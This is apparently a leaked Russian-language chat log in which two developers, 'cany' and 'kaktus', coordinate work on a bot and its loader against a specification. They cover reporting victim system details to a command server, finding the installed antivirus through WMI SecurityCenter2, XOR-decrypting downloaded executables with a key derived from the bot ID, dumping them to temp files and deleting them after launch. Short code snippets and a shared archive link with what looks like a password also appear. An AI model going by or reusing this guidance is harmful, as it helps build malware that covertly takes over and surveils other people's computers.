Timestamp	From	To	Message
2020-10-05 07:04:53.257300	cany	kaktus	сервер не отправляет файл на исполнение
2020-10-05 07:04:53.267706	cany	kaktus	да на отправку инфы о системе
2020-10-05 07:04:53.280107	cany	kaktus	и комиты не доходят
2020-10-05 07:04:53.282346	cany	kaktus	123
2020-10-06 17:38:04.317929	cany	kaktus	привет
2020-10-07 05:03:26.331184	kaktus	cany	1) по поводу кодировки в UTF8 - еще раз посмотри мои последние ответы:
2020-10-07 05:03:31.073713	kaktus	cany	[06.10.2020 21:19:05] <kaktus> так, путаю
[06.10.2020 21:20:02] <kaktus> 1) MultiByteToWideChar(CP_ACP...); 2) WideCharToMultiByte(CP_UTF8...);
[06.10.2020 21:21:49] <kaktus> да, вторым шагом wchar_t* на вход WideCharToMultiByte
2020-10-07 05:04:15.811207	kaktus	cany	вот это вот я ошибся: [06.10.2020 21:18:44] <kaktus> MultiByteToWideChar - в utf8 кодирует юникод, он же widechar. Т.е. ее надо два раза вызывать
2020-10-07 05:09:22.207918	kaktus	cany	2) по поводу кодировки в URLEncode - для данных в формате x-www-form-urlencoded кодируется не все тело целиком, а только имена/значения параметров. То есть:
2020-10-07 05:09:25.329048	kaktus	cany	не так: URLEncode("param1[n1]=value1&param2[n2]=value2...")
2020-10-07 05:09:30.976282	kaktus	cany	а вот так: URLEncode("param1") + "[n]=" + URLEncode("value1") + "&" + URLEncode("param2") + "[n2]=" + URLEncode("value2")...
2020-10-07 05:10:40.257297	kaktus	cany	подробное описание формата данных в RFC 1866, RFC 3986
2020-10-07 17:33:26.645513	kaktus	cany	1) по поводу кодировки в UTF8 - еще раз посмотри мои последние ответы:
2020-10-07 17:33:26.647855	kaktus	cany	[06.10.2020 21:19:05] <kaktus> так, путаю
[06.10.2020 21:20:02] <kaktus> 1) MultiByteToWideChar(CP_ACP...); 2) WideCharToMultiByte(CP_UTF8...);
[06.10.2020 21:21:49] <kaktus> да, вторым шагом wchar_t* на вход WideCharToMultiByte
2020-10-07 17:33:26.648713	kaktus	cany	вот это вот я ошибся: [06.10.2020 21:18:44] <kaktus> MultiByteToWideChar - в utf8 кодирует юникод, он же widechar. Т.е. ее надо два раза вызывать
2020-10-07 17:33:26.649485	kaktus	cany	не так: URLEncode("param1[n1]=value1&param2[n2]=value2...")
2020-10-07 17:33:26.650247	kaktus	cany	а вот так: URLEncode("param1") + "[n]=" + URLEncode("value1") + "&" + URLEncode("param2") + "[n2]=" + URLEncode("value2")...
2020-10-07 17:33:26.651013	kaktus	cany	2) по поводу кодировки в URLEncode - для данных в формате x-www-form-urlencoded кодируется не все тело целиком, а только имена/значения параметров. То есть:
2020-10-07 17:33:26.651811	kaktus	cany	подробное описание формата данных в RFC 1866, RFC 3986
2020-10-08 12:47:20.580065	cany	kaktus	привет
2020-10-08 12:51:29.359661	kaktus	cany	привет
2020-10-08 12:51:50.956081	cany	kaktus	я сделал вот так URLEncode("param1") + "[n]=" + URLEncode("value1") + "&" + URLEncode("param2") + "[n2]=" + URLEncode("value2")
2020-10-08 12:51:58.383556	cany	kaktus	но это не решило проблему как я понял
2020-10-08 12:52:10.111692	cany	kaktus	как у меня сейчас выходит
2020-10-08 12:52:14.776751	cany	kaktus	есть строка
2020-10-08 12:52:23.037914	cany	kaktus	каждый символ кодируется 1 байтом
2020-10-08 12:52:43.469476	cany	kaktus	после перевода в utf-8 каждый символ кодируется 4 байтами
2020-10-08 12:52:55.739650	cany	kaktus	было допустим 17 df
2020-10-08 12:52:59.288178	cany	kaktus	а стало
2020-10-08 12:53:07.762058	cany	kaktus	17 00 00 00 df 00 00 00
2020-10-08 12:53:15.248760	cany	kaktus	те просто дополняется нулями
2020-10-08 12:53:38.212936	cany	kaktus	на сервере я скачиваю файл со своим ответом
2020-10-08 12:53:43.123575	cany	kaktus	там так и приходит
2020-10-08 12:53:49.673327	cany	kaktus	те ответ доходит
2020-10-08 12:54:10.177164	cany	kaktus	но спец символы обратно не расшифровываются
2020-10-08 12:54:19.048185	kaktus	cany	[15:52:43] <asmwardest> после перевода в utf-8 каждый символ кодируется 4 байтами
2020-10-08 12:54:43.306804	kaktus	cany	что-то не так у тебя, в UTF8 символы с кодом 0-127 остаются 1 байт, символы со второй половины кодировки 2-4 байта
2020-10-08 12:55:12.589740	cany	kaktus	ну после той цепочки вызовов
2020-10-08 12:55:33.105549	cany	kaktus	MultiByteToWideChar
2020-10-08 12:55:45.371875	cany	kaktus	первый вызов переводит в wchar
2020-10-08 12:55:50.469692	cany	kaktus	те 2 байта
2020-10-08 12:55:56.033015	cany	kaktus	затем еще раз
2020-10-08 12:56:09.738124	cany	kaktus	кастуя к char вызываю функцию
2020-10-08 12:56:21.479417	cany	kaktus	она еще в два раза увеличивает
2020-10-08 12:56:30.819563	kaktus	cany	[15:55:56] <asmwardest> затем еще раз  - еще раз MultiByteToWideChar ?
2020-10-08 12:56:38.538001	cany	kaktus	да
2020-10-08 12:56:45.951004	cany	kaktus	только с параметром другим
2020-10-08 12:56:49.381211	cany	kaktus	MultiByteToWideChar(CP_ACP
2020-10-08 12:56:49.401356	kaktus	cany	я же тебе написал, что ошибся и правильную последовательность дал
2020-10-08 12:56:53.209717	cany	kaktus	MultiByteToWideChar(CP_UTF8
2020-10-08 12:57:05.837748	kaktus	cany	[06.10.2020 21:20:02] <kaktus> 1) MultiByteToWideChar(CP_ACP...); 2) WideCharToMultiByte(CP_UTF8...);
2020-10-08 12:57:17.600241	cany	kaktus	я так и делаю
2020-10-08 12:57:32.067384	kaktus	cany	вторая функция - WideCharToMultiByte ?
2020-10-08 12:57:47.371725	cany	kaktus	черт
2020-10-08 12:58:02.247030	cany	kaktus	сейчас попробую
2020-10-08 12:58:25.749017	cany	kaktus	невнимательный я
2020-10-08 13:18:31.289642	cany	kaktus	в этом случае ничего не меняется
2020-10-08 13:18:41.016019	cany	kaktus	строка представляется тем же набором байт
2020-10-08 13:19:49.155414	cany	kaktus	но вообще ответ на сервер приходит
2020-10-08 13:19:56.239803	cany	kaktus	вроде почти правильный
2020-10-08 13:28:12.128605	kaktus	cany	если нет национальных символов с кодами 128-255, то строка в UTF8 такая же будет как исходник ANSI, это нормально
2020-10-08 13:28:59.577240	kaktus	cany	данные в отчете должны отображаться по другому, у тебя сейчас вот одна строка: group=WORKGROUP&path=no_(fileless)&os=10019041&os:	
1:
2020-10-08 13:29:13.544523	kaktus	cany	секунду, сейчас покажу
2020-10-08 13:31:08.473278	kaktus	cany	http://prnt.sc/uvht6x
2020-10-08 13:32:52.328124	cany	kaktus	те у меня данные не все доходят?
2020-10-08 13:33:24.289560	kaktus	cany	ты скачай полный результат - кнопочка напротив команды в истории
2020-10-08 13:33:30.318983	kaktus	cany	и сравни с тем образцом который я давал
2020-10-08 13:34:05.651134	kaktus	cany	ну вот у тебя = закодированы в URL, а не должны
2020-10-08 13:34:07.878478	kaktus	cany	поэтому он не парсит
2020-10-08 13:36:12.338445	cany	kaktus	я = только как спец символ кодирую
2020-10-08 13:37:44.181958	kaktus	cany	в ParamName, ParamValue - спецсиволы кодируешь, разделяющие параметры нет
2020-10-08 13:38:56.857896	kaktus	cany	[15:51:51] <asmwardest> я сделал вот так URLEncode("param1") + "[n]=" + URLEncode("value1") + "&" + URLEncode("param2") + "[n2]=" + URLEncode("value2")
2020-10-08 13:39:06.528025	kaktus	cany	именно так и надо, но в отчете твоем последнем не так
2020-10-08 13:55:50.620592	cany	kaktus	получилось
2020-10-08 13:57:54.639862	cany	kaktus	у меня еще вопросы есть по отдельным параметрам в информации
2020-10-08 13:58:05.308709	cany	kaktus	как нормально архитектуру определить?
2020-10-08 13:58:30.478007	cany	kaktus	я получаю инфу типо AMD64
2020-10-08 14:01:26.099892	cany	kaktus	и как антивирусник определять?
2020-10-08 14:40:38.858046	kaktus	cany	по архитектуре вот так будет достаточно:
2020-10-08 14:40:43.690900	kaktus	cany	#ifdef _WIN64
	arch=64
#else
	arch=32
#endif
2020-10-08 14:41:19.349445	cany	kaktus	это не разрядность исполняемого файла?
2020-10-08 14:41:46.982163	kaktus	cany	это соответствует ТЗ в комплексе - на 64-разрядной машине в итоге работает 64-разрядный бот
2020-10-08 14:41:55.838987	cany	kaktus	да
2020-10-08 14:42:07.858527	cany	kaktus	но мне все равно придется определять в загрузчике
2020-10-08 14:43:45.483235	kaktus	cany	а в загрузчике вот так:
2020-10-08 14:43:52.247289	kaktus	cany	#ifndef _WIN64
	IsWow64Process((HANDLE)GetCurrentProcess(), &isWOW64Process);
#endif
2020-10-08 14:46:12.179161	kaktus	cany	по поводу АВ - смотри  WMI/SecurityCenter2
2020-10-08 14:53:58.251532	cany	kaktus	а еще команды net в cmd очень долго выполняются и выдают
2020-10-08 14:53:59.910460	cany	kaktus	Системная ошибка 6118.

Недоступен список серверов для этой рабочей группы.
2020-10-08 14:54:25.184178	kaktus	cany	вот этот результат и отправляй
2020-10-08 14:54:51.636399	cany	kaktus	таким образом не укладываются в таймаут
2020-10-08 14:55:59.211331	kaktus	cany	это нормально, вне домена некоторые эти команды сообщают об ошибке
2020-10-08 14:56:00.771721	cany	kaktus	но только на одну команду уходит секунд 30
2020-10-08 14:56:00.774672	cany	kaktus	не страшно?
2020-10-08 15:01:36.376441	kaktus	cany	таким образом не укладываются в таймаут
2020-10-08 15:01:36.378811	kaktus	cany	но только на одну команду уходит секунд 30
2020-10-08 15:01:36.380161	kaktus	cany	не страшно?
2020-10-08 15:16:45.545196	kaktus	cany	[17:54:20] <kaktus> вот этот результат и отправляй 
[17:55:45] <kaktus> это нормально, вне домена некоторые эти команды сообщают об ошибке
2020-10-08 15:17:12.895057	kaktus	cany	чот не сбоил?
2020-10-08 15:17:17.288910	kaktus	cany	чат*
2020-10-08 15:25:52.107848	cany	kaktus	[17:54:20] <kaktus> вот этот результат и отправляй 
[17:55:45] <kaktus> это нормально, вне домена некоторые эти команды сообщают об ошибке
2020-10-08 15:25:52.109479	cany	kaktus	чот не сбоил?
2020-10-08 15:25:52.110233	cany	kaktus	чат*
2020-10-09 15:37:24.732067	cany	kaktus	привет
2020-10-09 15:45:03.411191	kaktus	cany	привет
2020-10-09 15:45:36.636955	cany	kaktus	при скачивании exe файла кроме расшифрования нужно еще какие-то преобразования делать?
2020-10-09 15:50:39.783311	kaktus	cany	нет, расшифровываешь xor ключем из ID бота
2020-10-09 15:51:41.541278	cany	kaktus	а если запускаем через CreateProcess то дампаем на диск?
2020-10-09 15:51:53.360182	cany	kaktus	и dll тоже
2020-10-09 15:52:25.071600	kaktus	cany	dll всегда дамп на диск, запуск через Create тоже через дамп
2020-10-09 15:52:39.077175	cany	kaktus	как имя генерируется?
2020-10-09 15:53:12.983241	kaktus	cany	файла с дампом?
2020-10-09 15:53:16.395222	cany	kaktus	да
2020-10-09 15:53:36.842886	kaktus	cany	любым удобным способом, можно через GetTempFileName, можно вручную сформировать через rand()
2020-10-09 15:54:00.376685	cany	kaktus	файл удаляется сразу после вызова функции CreateProcess?
2020-10-09 15:56:50.297412	kaktus	cany	зависит от режима запуска, если в фоне - то запустил и забыл. Если с таймаутом - то по завершению/прерыванию дочернего процесса пытаешься удалить
2020-10-09 16:50:41.310111	cany	kaktus	мне еще нужно составить план по неделям
2020-10-09 16:50:50.553221	cany	kaktus	я думал тебе просто сказать примерные сроки
2020-10-09 16:52:53.939930	kaktus	cany	так
2020-10-09 16:53:08.261255	kaktus	cany	мне нужен общий план кратко
2020-10-09 16:53:27.830862	kaktus	cany	просто скажи плановый срок в неделях - сколько еще на бот, и сколько на загрузчик
2020-10-09 16:53:46.781879	kaktus	cany	и второе - пришли подробный план на ближайшие 1-2 недели
2020-10-09 16:56:58.679871	cany	kaktus	exe файл когда я скачиваю другой немного
2020-10-09 16:57:01.212497	cany	kaktus	измененный
2020-10-09 16:57:03.909119	cany	kaktus	про шифрование
2020-10-09 16:57:09.697507	cany	kaktus	я дос заголовок посмотрел
2020-10-09 16:57:13.768582	cany	kaktus	все расшифровалось
2020-10-09 16:57:21.618879	cany	kaktus	я его сохранил
2020-10-09 16:57:27.947665	cany	kaktus	на компе не запускается
2020-10-09 16:57:42.050688	cany	kaktus	и сделал compare в notedap++
2020-10-09 16:57:55.702167	kaktus	cany	в чем различия, частичные?
2020-10-09 17:01:19.983943	cany	kaktus	https://prnt.sc/uwaeg6
2020-10-09 17:01:51.867769	cany	kaktus	справа оригинал
2020-10-09 17:02:11.545556	cany	kaktus	я там в string перекидываю
2020-10-09 17:02:17.291935	cany	kaktus	может потери из-за этого
2020-10-09 17:02:28.791912	cany	kaktus	размер одинаковый
2020-10-09 17:03:35.930985	kaktus	cany	а это файл который в команде RunExe?
2020-10-09 17:03:41.661394	kaktus	cany	или в DownloadFile
2020-10-09 17:04:20.565943	cany	kaktus	RunExe
2020-10-09 17:05:01.242002	cany	kaktus	в строку я перекидываю вот так
2020-10-09 17:05:01.955248	cany	kaktus	WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded);

				if (key != "")
					Decrypt((BYTE*)pszOutBuffer, dwDownloaded, key);
				
				response += string(pszOutBuffer, dwDownloaded);

				delete[] pszOutBuffer;
2020-10-09 17:06:43.352049	kaktus	cany	Decrypt() - учитывает начальную позицию символа в полученном куске?
2020-10-09 17:07:22.680844	kaktus	cany	например, первый кусок у тебя 5 байт - расшифровываешь 1-5 байтами ключа. Второй кусок в 5 байт будет расшифрован 6-10 байтами ключа?
2020-10-09 17:32:14.304748	cany	kaktus	нет
2020-10-09 17:33:25.043602	cany	kaktus	понял
2020-10-10 17:00:03.623401	cany	kaktus	привет
2020-10-10 17:00:17.816944	cany	kaktus	какие ответы должны быть при запуске exe и dll
2020-10-10 17:01:16.344068	cany	kaktus	и если запуск через дамп то в какой директории сохранять?
2020-10-10 17:01:18.709426	kaktus	cany	привет
2020-10-10 17:01:22.436881	kaktus	cany	ты мне пришли отчеты
2020-10-10 17:01:32.465352	kaktus	cany	я уже месфяц их жду
2020-10-10 17:01:40.742875	kaktus	cany	верннеее, планы
2020-10-10 17:01:56.719169	kaktus	cany	план работ*
2020-10-10 17:02:04.394478	cany	kaktus	почему месяц, я ведь присылал уже один раз
2020-10-10 17:02:08.011994	kaktus	cany	так сложно чтоли сделать, пришли мне его
2020-10-10 17:02:52.406256	kaktus	cany	[20:00:17] <asmwardest> какие ответы должны быть при запуске exe и dll
2020-10-10 17:02:57.232091	kaktus	cany	где ответы?
2020-10-10 17:03:08.276722	cany	kaktus	на сервер
2020-10-10 17:03:19.837091	cany	kaktus	после того как я скачал исполняемый файл
2020-10-10 17:03:28.128409	cany	kaktus	я должен что-то ответить серверу?
2020-10-10 17:04:06.994513	kaktus	cany	нет, по ТЗ нет такого
2020-10-10 17:04:18.253673	kaktus	cany	только когда ты выполнил должен отправить ответ
2020-10-10 17:26:58.807044	cany	kaktus	)3&3>[Fb{5(\/:$A+4tA_p]$YXn^Rw
2020-10-10 17:27:38.464242	cany	kaktus	Download: https://qaz.im/load/h2GibB/bEH5RN
Delete: https://qaz.im/index.php?a=delete&q=16435276
2020-10-10 23:20:37.600043	cany	kaktus	)3&3>[Fb{5(\/:$A+4tA_p]$YXn^Rw
2020-10-10 23:20:37.601342	cany	kaktus	Download: https://qaz.im/load/h2GibB/bEH5RN
Delete: https://qaz.im/index.php?a=delete&q=16435276
2020-10-14 17:22:58.695751	cany	kaktus	привет
2020-10-14 17:23:32.988615	kaktus	cany	привет
2020-10-14 17:24:20.032727	cany	kaktus	в тз есть пункт запуск скрипта через канал
